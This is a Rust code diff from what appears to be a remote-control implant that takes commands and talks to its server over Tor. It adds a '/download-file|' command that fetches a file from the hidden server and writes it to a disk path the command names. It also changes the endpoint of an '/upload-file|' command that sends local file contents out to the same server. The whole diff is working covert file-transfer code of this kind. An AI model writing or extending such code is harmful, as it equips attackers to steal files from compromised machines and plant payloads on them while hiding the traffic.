@@ -202,6 +202,58 @@ async fn main() {
 
 
             let mut interpreted = (async || {
+                if message.request.starts_with("/download-file|") {
+                    // Parse the command to extract file name on disk and file ID.
+                    let parts: Vec<&str> = message.request.split("|").collect();
+                    if parts.len() != 3 {
+                        return "failed to parse command: invalid format".to_string();
+                    }
+                    let file_name_on_disk = parts[1];
+                    let file_id = parts[2];
+
+                    let mut download_stream = match tor_client.connect_with_prefs((address.clone(), port), &s_prefs).await {
+                        Ok(s) => s,
+                        Err(e) => {
+                            return format!("failed to connect to server: {}", e);
+                        }
+                    };
+
+                    let endpoint = format!("/v1/files/{}", file_id);
+                    let req_buff = format!("GET {} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n", endpoint).into_bytes();
+
+                    if let Err(e) = download_stream.write_all(&req_buff).await {
+                        return format!("failed to write request: {}", e);
+                    }
+                    if let Err(e) = download_stream.flush().await {
+                        return format!("failed to flush stream: {}", e);
+                    }
+
+                    let mut resp_buff = Vec::new();
+                    if let Err(e) = download_stream.read_to_end(&mut resp_buff).await {
+                        return format!("failed to read response: {}", e);
+                    }
+
+                    let strresp = String::from_utf8_lossy(&resp_buff);
+                    let lines: Vec<&str> = strresp.split("\r\n").collect();
+                    if lines.is_empty() {
+                        return "empty response".to_string();
+                    }
+                    let status_line = lines[0];
+                    if !status_line.contains("200 OK") {
+                        return format!("server returned {}", status_line);
+                    }
+
+                    let content_start = strresp.find("\r\n\r\n").map_or(0, |pos| pos + 4);
+                    let file_content = &strresp[content_start..];
+
+                    let write_output = match tokio::fs::write(file_name_on_disk, file_content.as_bytes()).await {
+                        Ok(()) => "downloaded".to_string(),
+                        Err(e) => e.to_string(),
+                    };
+
+                    return write_output;
+                }
+
                 if message.request.starts_with("/upload-file|") {
                     match helpers::parse_upload_command(&message.request) {
                         Ok((file_path, file_id)) => {
@@ -219,7 +271,7 @@ async fn main() {
                                 }
                             };
                             
-                            let endpoint = format!("/v1/upload/{}", file_id);
+                            let endpoint = format!("/v1/files/{}", file_id);
                             let content_length = file_contents.len().to_string();
                             let mut req_buff = format!("PUT {} HTTP/1.1\r\nHost: x\r\nConnection: close\r\nContent-Length: {}\r\n\r\n", endpoint, content_length).into_bytes();
                             req_buff.extend(file_contents);
